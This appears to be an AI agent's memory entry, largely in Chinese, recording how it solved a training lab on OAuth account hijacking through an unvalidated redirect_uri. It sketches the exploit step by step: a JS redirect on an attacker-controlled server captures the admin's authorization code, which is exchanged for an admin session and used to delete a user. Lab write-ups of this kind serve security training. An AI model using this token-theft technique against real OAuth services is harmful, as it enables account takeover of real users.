---
metadata:
  node_type: memory
name: "OAuth redirect_uri hijack lab A"
description: "lab-oauth-account-hijacking-via-redirect-uri/A: redirect_uri 未校验 → admin 码经 exploit 域泄漏 → 换会话删 carlos;DELIVER 须 --follow"
last_updated: 2026-10-10T15:20:29+08:00
created: 2026-10-10T15:20:29+08:00
---

## 2026-10-10 lab-oauth-account-hijacking-via-redirect-uri (arm A) — solved

- Instance: lab 0a8d008904b75b40802c4ecb00cd0069, OAuth provider oauth-...oauth-server.net (Ory Hydra 形). client_id=xutqw49n955l2tqyrv1cu, redirect_uri 注册值 = lab-host/oauth-callback。
- Flaw: OAuth /auth 不校验 redirect_uri(任意域被接受,直接 302 到 /interaction 登录面),授权码可被重定向到攻击者域。
- Flow: /my-account → 302 /social-login → meta refresh 到 /auth?client_id=..&redirect_uri=lab/oauth-callback&response_type=code&scope=openid profile email。
- Exploit: exploit server 存一个 JS 页 window.location=auth-url(redirect_uri 换成 exploit-server),DELIVER_TO_VICTIM 必须 --follow 走 302 /deliver-to-victim,否则受害者不被召唤。受害者(admin,已持 OAuth 会话+已同意)访问 → 码落 exploit server 访问日志 GET /?code=...。
- 陷阱: admin 的码从访问日志读出(本臂 GET /log);自己测的码会污染日志(时间戳/UA ureq 区分)。
- 收口: GET lab/oauth-callback?code=<admin code> 换会话(Set-Cookie session=..,页显示 Admin panel + my-account?id=administrator)→ GET /admin/delete?username=carlos → banner solved。
- 件: page_read/range_launch/http_session/nap/banner_verdict。无自研件需求。

